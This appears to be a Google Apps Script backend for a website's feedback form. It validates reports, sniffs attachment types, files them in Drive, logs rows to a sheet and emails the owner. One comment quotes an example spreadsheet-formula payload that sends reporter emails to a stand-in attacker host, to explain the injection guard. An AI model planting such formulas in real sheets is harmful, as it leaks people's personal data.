/**
 * GlobalStudyBoard — "Share feedback / Report an issue" backend (Google Apps Script).
 *
 * THIS FILE MIRRORS THE DEPLOYED SCRIPT and is the source of truth — keep the
 * two in sync. The script is bound to its own spreadsheet, **"GlobalStudyBoard
 * Feedback"**. It is deliberately SEPARATE from the "GlobalStudyBoard App
 * Testers" sheet/script (feedback carries free text, optional email addresses
 * and files, with its own retention promise on /privacy) and from anything
 * belonging to VedKosh — never point this site at either of those.
 *
 * FLOW
 *   Website "Share feedback" / "Report an issue"  ->  components/FeedbackModal.tsx
 *     ->  POST /api/feedback   (same-origin gate, size cap, rate limit, honeypot,
 *                               field + magic-byte validation)
 *     ->  this web app         (re-validates, files attachments in Drive,
 *                               appends a row, emails the owner with LINKS —
 *                               files live only in Drive, so deletion is real)
 *     ->  sheet "Feedback"     (owner triages; sets Status as they go)
 *
 * OWNER SETUP (one time, ~3 minutes):
 *   0. Sign in to Google as the GSB project account, contact@globalstudyboard.com
 *      (owner directive, September 2026: every GlobalStudyBoard sheet, script and
 *      mailbox lives under the project's own account, never a personal or VedKosh
 *      one). The sheet, the Drive folder and the outgoing mail all belong to
 *      whichever account does the steps below.
 *   1. Create a Google Sheet named "GlobalStudyBoard Feedback" (any name works;
 *      the tab is created automatically).
 *   2. Extensions -> Apps Script.
 *   3. In Code.gs: Select-All (Cmd/Ctrl+A) -> Delete -> paste THIS entire file.
 *   4. Save (Cmd/Ctrl+S).
 *   5. Deploy -> New deployment -> type "Web app"
 *        Execute as:      Me
 *        Who has access:  Anyone
 *      -> Deploy -> Authorize access (Sheets + Drive + send email) -> copy the
 *      /exec URL.
 *   6. Put that URL in Vercel as the env var FEEDBACK_SCRIPT_URL
 *      (Production — and Development if you want it locally; leave Preview
 *      unset so branch deploys never write real rows), then redeploy.
 *   7. Confirm the account can send mail: in the editor run
 *        Logger.log(MailApp.getRemainingDailyQuota())
 *      and check it logs a number above 0 (1,500 on Workspace, 100 on consumer
 *      Gmail). A Google account whose mailbox is hosted elsewhere has a quota of
 *      0 — every report would then be filed as "new (email failed)" and nobody
 *      would be notified; deploy from an account with a Google mailbox instead.
 *
 *   Reports are emailed to contact@globalstudyboard.com (FEEDBACK_TO below,
 *   the same address as CONTACT_EMAIL in lib/site-meta.ts). To route them
 *   elsewhere: Project Settings -> Script Properties -> OWNER_EMAIL.
 *
 *   To CHANGE the code later: edit here, then
 *   Deploy -> Manage deployments -> pencil/Edit -> Version "New version" -> Deploy.
 *   Editing the EXISTING deployment keeps the same /exec URL, so no env change
 *   is needed. Do NOT use "New deployment" — that mints a new URL.
 *
 * SHEET
 *   Feedback [Timestamp | Reference | Type | Title | Page | Details | Expected |
 *             Reporter email | Destination | Audience | Viewport | Language |
 *             User agent | Attachments | Status]
 *   Status starts as "new" (or "new (email failed)" / "new (email skipped: …)" /
 *   "new (busy: …)" when the hourly abuse ceiling or the mail quota kicked in —
 *   the row is always written). Attachments are Drive links into the private
 *   folder "GlobalStudyBoard Feedback Attachments" (created on first use,
 *   owner-only; see getAttachmentFolder_ for the trust boundary).
 *
 * CONTRACT WITH THE SITE (do not rename fields — see app/api/feedback/route.ts):
 *   POST {type:'feedback', clientRef?, kind:'suggestion'|'issue', title, url, actual,
 *         expected, idea, email, region, audience,
 *         tech:{ua, viewport, lang}|null,
 *         attachments:[{filename, mime, base64}]}        -> {"status":"ok","id":"GSB-XXXXXXXX"}
 *   GET  (any query)                                      -> {"status":"ok"}   health check only
 *
 * PRIVACY (site constitution §9): the report text, the optional email address
 * and the files are volunteered for exactly one purpose — fixing the site.
 * Do not add analytics, do not forward anything elsewhere, and do not expose
 * stored rows through doGet — the GET handler must never return data.
 */

var SHEET_NAME = 'Feedback';
var HEADERS = [
  'Timestamp',
  'Reference',
  'Type',
  'Title',
  'Page',
  'Details',
  'Expected',
  'Reporter email',
  'Destination',
  'Audience',
  'Viewport',
  'Language',
  'User agent',
  'Attachments',
  'Status',
];
var FOLDER_NAME = 'GlobalStudyBoard Feedback Attachments';
// Project inbox — keep in sync with CONTACT_EMAIL in lib/site-meta.ts.
var FEEDBACK_TO = 'contact@globalstudyboard.com';

// Must match lib/feedback.ts on the site.
var MAX_ATTACHMENTS = 2;
var MAX_ATTACHMENT_BYTES = 1572864; // 1.5 MB per file
var MAX_TOTAL_ATTACHMENT_BYTES = 2621440; // 2.5 MB combined
var MIN_ATTACHMENT_BYTES = 128;
var TITLE_MAX = 140;
var TEXT_MAX = 3000;
var URL_MAX = 1000;
var EMAIL_MAX = 254;
var TECH_MAX = 600;

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON
  );
}

function getFeedbackSheet_(ss) {
  var sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) sheet = ss.insertSheet(SHEET_NAME);
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
    sheet.setFrozenRows(1);
  }
  return sheet;
}

/**
 * Neutralise spreadsheet formula injection.
 *
 * Google Sheets EVALUATES a string written by appendRow if it starts with =, +,
 * - or @ (a leading TAB/CR can also start one). This web app is deployed "Who
 * has access: Anyone", so every value arriving here is attacker-controllable —
 * and this endpoint accepts FREE TEXT from any visitor, so the guard is not
 * optional. A payload such as
 *   =IMPORTXML("https://attacker.example/?d="&H2, "//x")
 * would fire the moment the owner opened the sheet and quietly exfiltrate the
 * reporter emails in column H. Prefixing with an apostrophe forces Sheets to
 * store the value as literal text; the apostrophe is not shown in the cell.
 */
function safeCell_(v) {
  var s = String(v == null ? '' : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function str_(v, max) {
  return String(v == null ? '' : v).substring(0, max);
}

/**
 * Same structural check as FEEDBACK_EMAIL_RE in lib/feedback.ts — any provider
 * is fine for a follow-up reply, but NO whitespace of any kind (the value
 * becomes the mail's replyTo, so a CR/LF here would be header injection).
 */
function looksLikeEmail_(email) {
  return (
    email.length <= EMAIL_MAX && /^[^\s@]{1,64}@[^\s@.]+(\.[^\s@.]+)+$/.test(email)
  );
}

/**
 * Magic-byte sniff on the DECODED bytes — the only authority on a file's type,
 * re-checked here even though the site already did it (defence in depth: the
 * /exec URL is public). Apps Script's base64Decode yields SIGNED bytes
 * (-128..127), hence the `& 0xff`.
 */
function sniffMime_(bytes) {
  function b(i) {
    return bytes[i] & 0xff;
  }
  if (
    bytes.length >= 8 &&
    b(0) === 0x89 && b(1) === 0x50 && b(2) === 0x4e && b(3) === 0x47 &&
    b(4) === 0x0d && b(5) === 0x0a && b(6) === 0x1a && b(7) === 0x0a
  ) {
    return 'image/png';
  }
  if (bytes.length >= 3 && b(0) === 0xff && b(1) === 0xd8 && b(2) === 0xff) {
    return 'image/jpeg';
  }
  if (bytes.length >= 4 && b(0) === 0x25 && b(1) === 0x50 && b(2) === 0x44 && b(3) === 0x46) {
    return 'application/pdf';
  }
  return null;
}

/** True only for a live folder this account OWNS (never a shared or trashed one). */
function isOwnLiveFolder_(folder) {
  try {
    if (folder.isTrashed()) return false;
    var owner = folder.getOwner();
    return !!owner && owner.getEmail() === Session.getEffectiveUser().getEmail();
  } catch (e) {
    return false;
  }
}

/**
 * The private Drive folder attachments are filed in; created on first use.
 *
 * Trust boundary: DriveApp.getFoldersByName() searches everything the account
 * can see — INCLUDING folders other people shared with it — and getFolderById()
 * happily returns a folder sitting in the trash. Because this file is a public
 * mirror, an attacker who shared a look-alike folder named FOLDER_NAME with the
 * project account could otherwise capture every screenshot. So: only the
 * account's own My Drive root is searched, a folder is accepted only if this
 * account owns it and it is not trashed, and a stale cached id is discarded.
 */
function getAttachmentFolder_() {
  var props = PropertiesService.getScriptProperties();
  var cachedId = props.getProperty('ATTACHMENT_FOLDER_ID');
  if (cachedId) {
    try {
      var cached = DriveApp.getFolderById(cachedId);
      if (isOwnLiveFolder_(cached)) return cached;
    } catch (e) {
      // Permanently deleted or inaccessible — fall through and recreate.
    }
    props.deleteProperty('ATTACHMENT_FOLDER_ID');
  }
  var folder = null;
  var existing = DriveApp.getRootFolder().getFoldersByName(FOLDER_NAME);
  while (existing.hasNext()) {
    var candidate = existing.next();
    if (isOwnLiveFolder_(candidate)) {
      folder = candidate;
      break;
    }
  }
  if (!folder) folder = DriveApp.createFolder(FOLDER_NAME);
  props.setProperty('ATTACHMENT_FOLDER_ID', folder.getId());
  return folder;
}

// ── Abuse ceiling (SEC review, Sept 2026) ────────────────────────────────────
// The /exec URL is public, and the site's per-IP limiter is per serverless
// instance, so a determined sender could still push thousands of reports a
// day — each one costing an email from this account's MailApp quota and up to
// 2.5 MB of Drive. A script-wide hourly ceiling, kept in CacheService, bounds
// that: past it, the row is still appended (nothing is lost) but attachments
// and the email are skipped and the Status says so. A separate, lower ceiling
// guards the mail quota itself.
var MAX_REPORTS_PER_HOUR = 60;
var MAX_MAILS_PER_HOUR = 30;
var MAIL_QUOTA_RESERVE = 20; // keep this many daily sends for the owner's own use

function bumpHourlyCounter_(key) {
  var cache = CacheService.getScriptCache();
  var n = 0;
  try {
    n = parseInt(cache.get(key) || '0', 10) || 0;
    n += 1;
    cache.put(key, String(n), 3600);
  } catch (e) {
    // Cache unavailable — treat as within limits rather than block real reports.
  }
  return n;
}

function mailAllowed_() {
  try {
    if (MailApp.getRemainingDailyQuota() <= MAIL_QUOTA_RESERVE) return false;
  } catch (e) {
    // Quota lookup failed — attempt the send; a failure is recorded on the row.
  }
  return bumpHourlyCounter_('gsb_fb_mails') <= MAX_MAILS_PER_HOUR;
}

/**
 * Decode, re-validate and build Blobs for the attachments. Returns null when
 * anything is off — the whole report is rejected rather than partially filed.
 */
function decodeAttachments_(raw, reference) {
  if (raw == null) return [];
  if (!Array.isArray(raw) || raw.length > MAX_ATTACHMENTS) return null;
  var blobs = [];
  var total = 0;
  for (var i = 0; i < raw.length; i++) {
    var item = raw[i] || {};
    var b64 = String(item.base64 || '');
    if (!b64 || !/^[A-Za-z0-9+\/]+={0,2}$/.test(b64)) return null;
    var bytes;
    try {
      bytes = Utilities.base64Decode(b64);
    } catch (e) {
      return null;
    }
    if (bytes.length < MIN_ATTACHMENT_BYTES || bytes.length > MAX_ATTACHMENT_BYTES) return null;
    total += bytes.length;
    if (total > MAX_TOTAL_ATTACHMENT_BYTES) return null;
    var mime = sniffMime_(bytes);
    if (!mime) return null;
    var ext = mime === 'image/png' ? 'png' : mime === 'image/jpeg' ? 'jpg' : 'pdf';
    // Filename is rebuilt here from the reference + index + SNIFFED extension;
    // the site's slug is kept only as a hint, and only if it is a plain slug.
    var hint = String(item.filename || '')
      .replace(/\.[A-Za-z0-9]{1,8}$/, '')
      .toLowerCase()
      .replace(/[^a-z0-9-]+/g, '-')
      .replace(/^-+|-+$/g, '')
      .substring(0, 40);
    var name = reference + '-' + (i + 1) + (hint ? '-' + hint : '') + '.' + ext;
    blobs.push(Utilities.newBlob(bytes, mime, name));
  }
  return blobs;
}

/**
 * Set the Status cell of THIS report's row. `hint` is the row index read right
 * after appendRow; it is verified against the Reference column and, if another
 * submission has landed in between, the row is located by Reference instead.
 */
function markRow_(sheet, hint, reference, status) {
  try {
    var col = HEADERS.length;
    if (hint > 1 && String(sheet.getRange(hint, 2).getValue()) === reference) {
      sheet.getRange(hint, col).setValue(status);
      return;
    }
    var last = sheet.getLastRow();
    if (last < 2) return;
    var refs = sheet.getRange(2, 2, last - 1, 1).getValues();
    for (var i = refs.length - 1; i >= 0; i--) {
      if (String(refs[i][0]) === reference) {
        sheet.getRange(i + 2, col).setValue(status);
        return;
      }
    }
  } catch (e) {
    // Status is advisory; the row itself is already written.
  }
}

function trashAll_(files) {
  for (var i = 0; i < files.length; i++) {
    try {
      files[i].setTrashed(true);
    } catch (e) {
      // Best effort — the owner can still find the file in the folder.
    }
  }
}

/** appendRow that trashes the just-filed attachments if the row cannot be written. */
function appendRowOrTrash_(sheet, files, row) {
  try {
    sheet.appendRow(row);
  } catch (rowErr) {
    trashAll_(files);
    throw rowErr;
  }
}

function ownerEmail_() {
  var configured = PropertiesService.getScriptProperties().getProperty('OWNER_EMAIL');
  if (configured && looksLikeEmail_(configured.trim())) return configured.trim();
  return FEEDBACK_TO;
}

function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    if (data.type !== 'feedback') {
      return json_({ error: 'Unknown type' });
    }

    var kind = data.kind === 'issue' ? 'issue' : data.kind === 'suggestion' ? 'suggestion' : null;
    var title = str_(data.title, TITLE_MAX).replace(/\s+/g, ' ').trim();
    var url = str_(data.url, URL_MAX).trim();
    var actual = kind === 'issue' ? str_(data.actual, TEXT_MAX).trim() : '';
    var expected = kind === 'issue' ? str_(data.expected, TEXT_MAX).trim() : '';
    var idea = kind === 'suggestion' ? str_(data.idea, TEXT_MAX).trim() : '';
    var details = kind === 'issue' ? actual : idea;
    var email = str_(data.email, EMAIL_MAX).trim().toLowerCase();

    // A suggestion may be site-wide (empty page link); an issue names a page.
    if (!kind || !title || !details || (url && !/^https?:\/\//i.test(url)) || (kind === 'issue' && !url)) {
      return json_({ error: 'Missing or invalid fields' });
    }
    if (email && !looksLikeEmail_(email)) {
      return json_({ error: 'Invalid email' });
    }

    var tech = data.tech && typeof data.tech === 'object' ? data.tech : null;
    var viewport = tech ? str_(tech.viewport, 24) : '';
    var lang = tech ? str_(tech.lang, 24) : '';
    var ua = tech ? str_(tech.ua, TECH_MAX) : '';
    var region = str_(data.region, 40);
    var audience = str_(data.audience, 20);

    // Idempotency: the site aborts its wait after 20 s, but a large report on a
    // cold start can still complete here after that. The visitor is then told to
    // retry, and the retry carries the same clientRef — answer it with the
    // original reference instead of filing the report twice.
    var clientRef = /^[A-Za-z0-9-]{8,64}$/.test(String(data.clientRef || ''))
      ? String(data.clientRef)
      : '';
    var cache = CacheService.getScriptCache();
    if (clientRef) {
      try {
        var seen = cache.get('gsb_fb_ref_' + clientRef);
        if (seen) return json_({ status: 'ok', id: seen, duplicate: true });
      } catch (e) {
        // Cache unavailable — proceed; worst case is one duplicate row.
      }
    }

    var reference =
      'GSB-' + Utilities.getUuid().replace(/-/g, '').substring(0, 8).toUpperCase();

    var blobs = decodeAttachments_(data.attachments, reference);
    if (blobs === null) {
      return json_({ error: 'Invalid attachment' });
    }

    // Script-wide ceiling: past it, the report is still recorded but nothing
    // costly (Drive files, an email) happens for it.
    var overCeiling = bumpHourlyCounter_('gsb_fb_reports') > MAX_REPORTS_PER_HOUR;

    // File the attachments first so the row can carry their links. If the row
    // then cannot be written, the files are trashed again — a report the site
    // reports as failed (and the visitor retries) must not leave orphans.
    var links = [];
    var files = [];
    if (blobs.length > 0 && !overCeiling) {
      var folder = getAttachmentFolder_();
      for (var i = 0; i < blobs.length; i++) {
        var file = folder.createFile(blobs[i]);
        files.push(file);
        links.push(file.getUrl());
      }
    }

    var ss;
    var sheet;
    try {
      ss = SpreadsheetApp.getActiveSpreadsheet();
      sheet = getFeedbackSheet_(ss);
    } catch (sheetErr) {
      trashAll_(files);
      throw sheetErr;
    }

    // The row is the record — write it BEFORE emailing, so a mail failure
    // (quota, transient) can never lose the report. appendRow + "which row was
    // mine" is not atomic under concurrent submissions, so the pair sits under
    // a script lock (as in tester-invites-webapp.gs); if the lock cannot be
    // had we still write and later locate the row by its Reference.
    var status = overCeiling
      ? 'new (busy: ' + (blobs.length ? 'attachments and ' : '') + 'email skipped)'
      : 'new';
    var lock = LockService.getScriptLock();
    var locked = false;
    try {
      locked = lock.tryLock(10000);
    } catch (lockErr) {
      locked = false;
    }
    var rowIndex = 0;
    try {
      // Every cell goes through safeCell_ — see the note on formula injection.
      appendRowOrTrash_(sheet, files, [
        new Date(),
        safeCell_(reference),
        safeCell_(kind),
        safeCell_(title),
        safeCell_(url),
        safeCell_(details),
        safeCell_(expected),
        safeCell_(email),
        safeCell_(region),
        safeCell_(audience),
        safeCell_(viewport),
        safeCell_(lang),
        safeCell_(ua),
        safeCell_(links.join('\n')),
        status,
      ]);
      rowIndex = sheet.getLastRow();
    } finally {
      if (locked) lock.releaseLock();
    }

    if (clientRef) {
      try {
        cache.put('gsb_fb_ref_' + clientRef, reference, 21600); // 6 h, the maximum
      } catch (e) {
        // Cache unavailable — the row is written; a retry may duplicate it.
      }
    }

    if (!overCeiling && mailAllowed_()) {
      try {
        var kindLabel = kind === 'issue' ? 'Issue' : 'Suggestion';
        var lines = [
          'GlobalStudyBoard feedback — ' + kindLabel,
          '',
          'Reference: ' + reference,
          'Page:      ' + (url || '(site-wide)'),
          'From:      ' + (email || '(no email given)'),
          'Destination: ' + (region || '—') + (audience ? ' · ' + audience : ''),
          '',
          'Title: ' + title,
          '',
        ];
        if (kind === 'issue') {
          lines.push('── What happens now ──', actual, '');
          if (expected) lines.push('── What should happen instead ──', expected, '');
        } else {
          lines.push('── Suggestion ──', idea, '');
        }
        if (tech) {
          lines.push(
            '── Page & browser details (visitor opted in) ──',
            'Viewport:   ' + viewport,
            'Language:   ' + lang,
            'User agent: ' + ua,
            ''
          );
        }
        // Attachments are LINKED, never attached: the Drive folder is the one
        // place a file lives, so the /privacy deletion promise stays keepable.
        lines.push(
          links.length ? 'Attachments (Drive): ' + links.join(' , ') : 'Attachments: none'
        );
        var mail = {
          to: ownerEmail_(),
          subject: 'GlobalStudyBoard Feedback — ' + kindLabel + ': ' + title,
          body: lines.join('\n'),
          name: 'GlobalStudyBoard',
        };
        if (email) mail.replyTo = email;
        MailApp.sendEmail(mail);
      } catch (mailErr) {
        // Note it on the row and carry on — the report itself is already safe.
        markRow_(sheet, rowIndex, reference, 'new (email failed)');
      }
    } else if (!overCeiling) {
      markRow_(sheet, rowIndex, reference, 'new (email skipped: mail quota)');
    }

    return json_({ status: 'ok', id: reference });
  } catch (err) {
    return json_({ error: String(err && err.message ? err.message : err) });
  }
}

/**
 * Health check only. This MUST NOT return any stored row — the sheet is the
 * single place reports live, and this endpoint is public.
 */
function doGet() {
  return json_({ status: 'ok' });
}
